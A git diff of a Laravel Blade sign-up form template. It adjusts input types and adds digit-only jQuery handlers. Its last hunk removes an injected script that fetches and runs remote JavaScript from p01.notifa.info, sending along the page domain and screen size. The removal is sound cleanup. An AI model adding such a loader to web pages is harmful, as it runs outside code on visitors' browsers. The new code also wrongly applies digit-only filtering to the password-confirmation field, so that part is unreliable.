@@ -30,10 +30,10 @@
       <div class="card-body">
         <div class="card-content p-2">
           <div class="text-center">
-            <img src="{{ asset('assets/images/mahaputra.jfif') }}">
+            <img style="height: 150px; width: 150px;" src="{{ asset('assets/images/mahaputra.jfif') }}">
           </div>
           <div class="card-title text-uppercase text-center py-3">Sign Up</div>
-          <form method="POST" action="{{ route('register') }}" id="submitForm">
+          <form method="POST" action="{{ route('register') }}" id="submitForm" autocomplete="off">
             @csrf
             <div class="form-group">
               <div class="position-relative has-icon-left">
@@ -52,7 +52,7 @@
             <div class="form-group">
               <div class="position-relative has-icon-left">
                 <label for="exampleInputEmailId" class="sr-only">Email Address</label>
-                <input type="text" id="exampleInputEmailId" class="form-control form-control-rounded @error('usr_email') is-invalid @enderror" placeholder="Email Address" name="usr_email" value="{{ old('usr_email') }}">
+                <input type="email" id="exampleInputEmailId" class="form-control form-control-rounded @error('usr_email') is-invalid @enderror" placeholder="Email Address" name="usr_email" value="{{ old('usr_email') }}">
                 <div class="form-control-position">
                   <i class="icon-envelope-open"></i>
                 </div>
@@ -63,20 +63,20 @@
                 @enderror
               </div>
             </div>
-            <div class="form-group">
-              <div class="position-relative has-icon-left">
-                <label for="exampleInputEmailId" class="sr-only">Phone Number</label>
-                <input type="text" id="usr_phone" value="{{ old('usr_phone') }}" class="form-control form-control-rounded @error('usr_phone') is-invalid @enderror" placeholder="Phone Number" name="usr_phone">
-                @error('usr_phone')
-                <span class="invalid-feedback" role="alert">
-                  <strong>{{ $message }}</strong>
-                </span>
-                @enderror
-                <div class="form-control-position">
-                  <i class="icon-phone"></i>
-                </div>
-              </div>
-            </div>
+              <div class="form-group" id="only-number">
+                          <div class="position-relative has-icon-left">
+                            <label for="exampleInputEmailId" class="sr-only">Phone Number</label>
+                            <input type="text" value="{{ old('usr_phone') }}" class="form-control form-control-rounded @error('usr_phone') is-invalid @enderror only-number" placeholder="Phone Number" name="usr_phone">
+                            @error('usr_phone')
+                            <span class="invalid-feedback" role="alert">
+                              <strong>{{ $message }}</strong>
+                            </span>
+                            @enderror
+                            <div class="form-control-position">
+                              <i class="icon-phone"></i>
+                            </div>
+                          </div>
+                        </div>
             <div class="form-group">
               <div class="position-relative has-icon-left">
                 <label for="exampleInputPassword" class="sr-only">Password</label>
@@ -94,7 +94,7 @@
             <div class="form-group">
               <div class="position-relative has-icon-left">
                 <label for="exampleInputRetryPassword" class="sr-only">Retry Password</label>
-                <input type="password" id="exampleInputRetryPassword" class="form-control form-control-rounded" placeholder="Retry Password" name="password_confirmation">
+                <input type="password" id="exampleInputRetryPassword" class="form-control form-control-rounded only-number" placeholder="Retry Password" name="password_confirmation">
                 <div class="form-control-position">
                   <i class="icon-lock"></i>
                 </div>
@@ -128,32 +128,31 @@
   <script src="{{asset('assets/js/popper.min.js')}}"></script>
   <script src="{{asset('assets/js/bootstrap.min.js')}}"></script>
 
-  <script type="text/javascript">
-    if (self == top) {
-      function netbro_cache_analytics(fn, callback) {
-        setTimeout(function() {
-          fn();
-          callback();
-        }, 0);
-      }
+    <script>
+        $(document).ready(function() {
+            $("#submitForm").submit(function(e) {
+                $(this).find("button[type='submit']").prop('disabled', true);
+                $("#btnSubmit").attr("disabled", true);
+                return true;
+            });
+            $('#only-number').on('keydown', '#usr_phone', function(e) {
+                -1 !== $
+                    .inArray(e.keyCode, [46, 8, 9, 27, 13, 110, 190]) || /65|67|86|88/
+                    .test(e.keyCode) && (!0 === e.ctrlKey || !0 === e.metaKey) ||
+                    35 <= e.keyCode && 40 >= e.keyCode || (e.shiftKey || 48 > e.keyCode || 57 < e.keyCode) &&
+                    (96 > e.keyCode || 105 < e.keyCode) && e.preventDefault()
+            });
+        });
 
-      function sync(fn) {
-        fn();
-      }
+         $(".only-number").on("keypress keyup blur",function (event) {    
+           $(this).val($(this).val().replace(/[^\d].+/, ""));
+            if ((event.which < 48 || event.which > 57)) {
+                event.preventDefault();
+            }
+        });
+    </script>
 
-      function requestCfs() {
-        var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
-        var idc_glo_r = Math.floor(Math.random() * 99999999999);
-        var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKuhGIPo3XfCO7NzFh%2bR4TNDzRRkmzfNjYBEvaH9PYWrTRLst0gOFrth%2b5%2bglwDMtd0b5zCWd17vzzhOpEuw6lAYJLz51ArrOOl8Y5SjZniMbiGG7ehzGvgxzMNS6uPTx4NZGMOhp%2biiQN98wF7PBI%2bb0GrGgCVCKQ0dbloBBvL2ab7jiRnWXkEkCN7LF8DoXa3CYAsn40pNJ9NGCiGJcDabb1TnBwqp8yKlYNfd7D7tJHpAKBbvvoknZZtmZEEFqyGz64b4RAzUVtY%2flEJUbQr555lVPEoOGy%2bbRuiUwsRGisTTwTHzjNr%2bqSyV%2blRSGujDRp1ph9bIzSGTIRng2ADGebgG2XfHhCmiWCwldmT%2bmdHJ9EQxkrc6Gf3tJcvjVb2d9mW7ALzjTiW0V9a%2b%2fKDQ%2fh6iF%2fRtq0tdYaBHJPGpZmRIO2geXKh4JuLo8AtaGSq3kCkKO38S%2fIoEDRNpBdrkY%2fd70RbUMnqyxrXpKkXjmqx6NWqzOgC22jlQYqhETIdE%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
-        var bsa = document.createElement('script');
-        bsa.type = 'text/javascript';
-        bsa.async = true;
-        bsa.src = url;
-        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
-      }
-      netbro_cache_analytics(requestCfs, function() {});
-    };
-  </script>
+
 </body>
 
 <!-- Mirrored from codervent.com/rocker/color-version/authentication-signup.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Nov 2019 12:20:55 GMT -->
